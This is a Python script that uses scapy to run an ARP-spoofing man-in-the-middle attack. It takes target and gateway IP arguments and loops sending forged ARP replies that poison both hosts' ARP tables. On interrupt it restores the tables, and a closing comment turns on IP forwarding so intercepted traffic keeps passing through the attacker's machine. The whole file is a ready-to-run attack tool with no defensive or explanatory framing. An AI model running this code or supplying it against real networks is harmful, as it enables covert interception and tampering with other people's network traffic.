#! usr/bin/env python

import scapy.all as scapy
import time
import sys
import optparse


def get_arguments():
    parser = optparse.OptionParser()
    parser.add_option("-t", "--target", dest="target_ip", help="Target ip address")
    parser.add_option("-g", "--gateway", dest="gateway_ip", help="Router ip address")
    (option, arguments) = parser.parse_args()
    if not option.target_ip:
        parser.error("\n[-] Please specify the target ip address, use --help for more info")
    elif not option.gateway_ip:
        parser.error("\n[-] Please specify the gateway ip address, use --help for more info")
    return option


def get_mac(ip):
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answered_list = scapy.srp(arp_request_broadcast, timeout=1, verbose=False)[0]
    return answered_list[0][1].hwsrc


def spoof(target_ip, spoof_ip):
    target_mac = get_mac(target_ip)
    packet = scapy.ARP(op=2, pdst=target_ip, hwdst=target_mac, psrc=spoof_ip)
    scapy.send(packet, verbose=False)


def restore(destination_ip, source_ip):
    destination_mac = get_mac(destination_ip)
    source_mac = get_mac(source_ip)
    packet = scapy.ARP(op=2, pdst=destination_ip, hwdst=destination_mac, psrc=source_ip, hwsrc=source_mac)
    scapy.send(packet, verbose=False, count=4)


sent_packet_count = 0
target_ip = get_arguments().target_ip
gateway_ip = get_arguments().gateway_ip
try:
    while True:
        spoof(target_ip=target_ip, spoof_ip=gateway_ip)
        spoof(target_ip=gateway_ip, spoof_ip=target_ip)
        sent_packet_count += 2
        print("\r[+] Sent packet: " + str(sent_packet_count)),
        # print("\r[+] Sent packet: " + str(sent_packet_count), end="")   # For python 3 and no need of import sys
        sys.stdout.flush()
        time.sleep(2)
except KeyboardInterrupt:
    print("\nRestoring ARP table..."),
    restore(destination_ip=target_ip, source_ip=gateway_ip)
    restore(destination_ip=gateway_ip, source_ip=target_ip)
    sys.stdout.flush()
    print("\rRestored ARP table successfully!!!")

# echo 1 > /proc/sys/net/ipv4/ip_forward
